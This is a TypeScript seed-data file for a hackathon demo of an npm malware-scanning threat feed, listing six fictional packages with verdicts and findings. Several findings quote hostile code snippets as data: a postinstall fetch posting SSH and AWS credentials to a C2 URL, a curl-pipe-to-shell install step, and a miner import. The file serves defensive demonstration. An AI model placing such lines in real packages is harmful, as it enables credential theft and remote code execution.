/**
 * Demo seed data for the threat feed / homepage stats.
 *
 * These are FICTIONAL packages invented for the hackathon demo so the feed
 * doesn't look empty next to the two real fixtures (esbuild, safedep-test-pkg).
 * None of these names refer to real npm packages; do not treat this as real
 * threat intelligence.
 */
import type { Report, VerdictRecord } from "@/lib/types/domain";

export interface SeedEntry {
  record: VerdictRecord;
  report: Report;
}

function iso(daysAgo: number, hour = 12): string {
  const d = new Date();
  d.setUTCDate(d.getUTCDate() - daysAgo);
  d.setUTCHours(hour, 0, 0, 0);
  return d.toISOString();
}

function ulid(seed: string): string {
  const chars = "0123456789ABCDEFGHJKMNPQRSTVWXYZ";
  let out = "01";
  let h = 0;
  for (let i = 0; i < seed.length; i++) h = (h * 31 + seed.charCodeAt(i)) >>> 0;
  for (let i = 0; i < 24; i++) {
    h = (h * 1103515245 + 12345) >>> 0;
    out += chars[h % chars.length];
  }
  return out;
}

function seedRecord(
  name: string,
  version: string,
  verdict: "MALICIOUS" | "SUSPICIOUS",
  confidence: "HIGH" | "MEDIUM" | "LOW",
  decidedBy: "intel" | "rules" | "ai" | "human",
  summary: string,
  signals: string[],
  daysAgo: number,
  source: "pkgguard" | "osv-import" = "pkgguard"
): VerdictRecord {
  return {
    package: { ecosystem: "npm", name, version },
    status: "COMPLETE",
    scanId: ulid(name + version),
    verdict,
    confidence,
    decidedBy,
    summary,
    signals,
    sha256: null,
    integrity: null,
    tarballUrl: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
    publishedAt: iso(daysAgo + 1),
    requestedAt: iso(daysAgo),
    analyzedAt: iso(daysAgo, 13),
    model: decidedBy === "ai" ? "claude-fable-5-1" : null,
    ranOn: "cloud",
    analyzerVersion: "0.1.0",
    source,
    reportS3Key: null,
    aiFailed: false,
    failureReason: null,
  };
}

function minimalReport(
  record: VerdictRecord,
  findings: Report["findings"]
): Report {
  return {
    package: record.package,
    analyzerVersion: record.analyzerVersion,
    generatedAt: record.analyzedAt ?? record.requestedAt,
    findings: findings ?? [],
    intel: { osv: { maliciousIds: [], vulnerabilityIds: [] } },
    metadata: {
      description: "Demo seed package for the threat feed.",
      license: "MIT",
      publisher: "unknown",
      trustedPublishing: false,
      provenance: false,
      maintainers: [],
      publishedAt: record.publishedAt,
      previousVersion: null,
      installScripts: {},
      repository: null,
      dependencies: {},
      fileCount: 4,
      unpackedBytes: 8_200,
    },
    codeScan: {
      filesScanned: 4,
      filesParsed: 3,
      filesWithParseErrors: 0,
      installTimeFiles: [],
      entryFiles: ["index.js"],
      executables: [],
      skipped: [],
      findingsTruncated: false,
    },
    aiReview: null,
    humanReview: null,
  };
}

export const FEED_SEED: SeedEntry[] = [
  (() => {
    const record = seedRecord(
      "fastjson-clone",
      "2.4.1",
      "MALICIOUS",
      "HIGH",
      "intel",
      "Matches a known malware signature (OpenSSF malicious-packages).",
      ["Known malware (OSV MAL- advisory)"],
      1
    );
    return {
      record,
      report: minimalReport(record, [
        {
          ruleId: "intel.osv.malicious",
          layer: "intel",
          severity: "HIGH",
          confidence: "HIGH",
          title: "Known malware (OSV MAL- advisory)",
          installTime: false,
          occurrences: 1,
        },
      ]),
    };
  })(),
  (() => {
    const record = seedRecord(
      "@acme/fetch-helper",
      "0.3.0",
      "MALICIOUS",
      "HIGH",
      "rules",
      "Reads SSH keys and AWS credentials, then sends them to a remote server during install.",
      ["Reads ~/.ssh and ~/.aws during install", "Sends data over the network during install"],
      2
    );
    return {
      record,
      report: minimalReport(record, [
        {
          ruleId: "code.exfiltration",
          layer: "static",
          severity: "HIGH",
          confidence: "HIGH",
          title: "Reads sensitive files and sends them over the network",
          file: "scripts/postinstall.js",
          line: 18,
          snippet: "fetch(C2_URL, { method: 'POST', body: JSON.stringify({ ssh, aws }) })",
          installTime: true,
          occurrences: 1,
        },
      ]),
    };
  })(),
  (() => {
    const record = seedRecord(
      "colorz-utils",
      "1.0.9",
      "SUSPICIOUS",
      "MEDIUM",
      "rules",
      "Runs an install script that downloads and executes a remote script.",
      ["Downloads and runs programs during install"],
      3
    );
    return {
      record,
      report: minimalReport(record, [
        {
          ruleId: "code.install_download_exec",
          layer: "static",
          severity: "MEDIUM",
          confidence: "MEDIUM",
          title: "Downloads and runs programs during install",
          file: "install.js",
          line: 12,
          snippet: "exec(`curl -s ${url} | sh`)",
          installTime: true,
          occurrences: 1,
        },
      ]),
    };
  })(),
  (() => {
    const record = seedRecord(
      "left-pad-pro",
      "1.1.0",
      "MALICIOUS",
      "HIGH",
      "intel",
      "Typosquat of a popular package; flagged as malware by SafeDep (human verified).",
      ["Typosquat of a popular package", "Flagged as malware by SafeDep (human verified)"],
      5
    );
    return {
      record,
      report: minimalReport(record, [
        {
          ruleId: "metadata.typosquat",
          layer: "metadata",
          severity: "HIGH",
          confidence: "HIGH",
          title: "Name closely resembles a popular package",
          installTime: false,
          occurrences: 1,
        },
        {
          ruleId: "intel.safedep.malware",
          layer: "intel",
          severity: "HIGH",
          confidence: "HIGH",
          title: "Flagged as malware by SafeDep (human verified)",
          installTime: false,
          occurrences: 1,
        },
      ]),
    };
  })(),
  (() => {
    const record = seedRecord(
      "ws-proxy-lite",
      "0.9.2",
      "SUSPICIOUS",
      "LOW",
      "ai",
      "AI review found the install script's network call suspicious but could not confirm intent.",
      ["Runs system commands (child_process)", "AI review: uncertain"],
      6
    );
    return {
      record,
      report: minimalReport(record, [
        {
          ruleId: "code.exec",
          layer: "static",
          severity: "MEDIUM",
          confidence: "MEDIUM",
          title: "Runs system commands (child_process)",
          file: "setup.js",
          line: 44,
          snippet: "child_process.exec(cfg.hook)",
          installTime: true,
          occurrences: 1,
        },
      ]),
    };
  })(),
  (() => {
    const record = seedRecord(
      "node-crypta",
      "3.2.0",
      "MALICIOUS",
      "HIGH",
      "human",
      "Confirmed cryptomining payload after admin review.",
      ["Runs a cryptocurrency miner", "Human verified"],
      8,
      "osv-import"
    );
    return {
      record,
      report: minimalReport(record, [
        {
          ruleId: "code.crypto_miner",
          layer: "static",
          severity: "HIGH",
          confidence: "HIGH",
          title: "Runs a cryptocurrency miner",
          file: "lib/worker.js",
          line: 6,
          snippet: "const miner = require('./xmrig-wrapper')",
          installTime: false,
          occurrences: 1,
        },
      ]),
    };
  })(),
];
